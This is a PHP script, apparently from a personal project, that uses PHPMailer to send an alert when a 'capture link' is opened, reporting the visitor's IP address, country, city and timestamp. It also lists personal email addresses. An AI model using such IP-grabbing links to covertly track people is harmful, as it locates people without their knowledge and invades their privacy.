<?php

namespace PHPMailer\PHPMailer;

session_start();

//include "../../php scripts/dynamicMailSettings.php"; // Importación de configuración dinámica


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require_once('../../vendor/phpmailer/phpmailer/src/PHPMailer.php');
require_once('../../vendor/phpmailer/phpmailer/src/SMTP.php');
require_once('../../vendor/phpmailer/phpmailer/src/Exception.php');

include "../../php scripts/dynamicSecrets.php";
include "../../php scripts/secrets.php.php";

$data = generatePasskey('dante');

//$mail->SMTPDebug    = 3;
$mail = new PHPMailer;
$mail->IsSMTP();
$mail->Host = "castelancarpinteyro.com"; #'classicandsacrum.com';   /*Servidor SMTP no pongas la ip, pon el nombre de la dns inversa*/																		
$mail->SMTPSecure = 'TLS';   /*Protocolo SSL o TLS*/
$mail->Port = 587;   /*Puerto de conexión al servidor SMTP*/
$mail->SMTPAuth = true;   /*Para habilitar o deshabilitar la autenticación*/
$mail->Username = $data[2]; #'academia@classicandsacrum.com';   /*Usuario, normalmente el correo electrónico*/
$mail->Password = $data[0];   /*Tu contraseña*/
$mail->From = $data[2]; #'academia@classicandsacrum.com';   /*Correo electrónico que estamos autenticando*/
$mail->FromName = $data[1];   /*Puedes poner tu nombre, el de tu empresa, nombre de tu web, etc.*/
$mail->CharSet = 'UTF-8';   /*Codificación del mensaje*/
//echo ($data[0] . " " . $data[1] . " " . $data[2]); // Debug command line

//$mail = setMailParameters('newsletter'); // Inicializar el objeto $mail con la función setMailParameters()



$mail->ClearAllRecipients();
$mail->AddAddress('cusv1111@gmail.com');
$mail->AddCC("dante@castelancarpinteyro.com");
$mail->AddCC("dantecc10@gmail.com");
//$mail->AddCC("agaliciav@cecyte.edu.mx");  //Comentados para no recibir
//$mail->AddCC("jhernandezbchg@cecyte.edu.mx"); //Comentados para no recibir

$mail->IsHTML(true);  // Podemos activar o desactivar HTML en el mensaje
$mail->Subject = 'Se ha añadido una IP a la base de datos';

$msg = "<h1>¡Nueva IP detectada!</h1>
            <p>Según la base de datos, hoy " . $_SESSION['timestamp'] . " se acaba de abrir el link de captura y tenemos nueva información aproximada.</p>
            <p>Recibe el siguiente mensaje:
            <table>
                <tr>
                    <th>IP</th>
                    <th>País</th>
                    <th>Ciudad</th>
                    <th>Marca de tiempo</th>
                </tr>

                <tr>
                    <td>" . $_SESSION['ip'] . "</td>
                    <td>" . $_SESSION['country'] . "</td>
                    <td>" . $_SESSION['city'] . "</td>
                    <td>" . $_SESSION['timestamp'] . "</td>
                </tr>
            </table>
            <p>Listo.</p>";

$mail->Body = $msg;

try {
    $mail->Send();
    // Resto del código...
} catch (Exception $e) {
    echo "Error al enviar el correo electrónico: " . $mail->ErrorInfo;
    echo "Excepción lanzada: " . $e->getMessage();
}
/*

// Eliminar todos los elementos de $_SESSION['id']
foreach ($_SESSION['id'] as $index => $value) {
    unset($_SESSION['id'][$index]);
}

$_SESSION['id'] = array();


foreach ($_SESSION['nombre'] as $index => $value) {
    unset($_SESSION['nombre'][$index]);
}

$_SESSION['nombre'] = array();


foreach ($_SESSION['email'] as $index => $value) {
    unset($_SESSION['email'][$index]);
}

$_SESSION['email'] = array();


foreach ($_SESSION['fecha'] as $index => $value) {
    unset($_SESSION['fecha'][$index]);
}

$_SESSION['fecha'] = array();


foreach ($_SESSION['mensaje'] as $index => $value) {
    unset($_SESSION['mensaje'][$index]);
}
$_SESSION['mensaje'] = array();
*/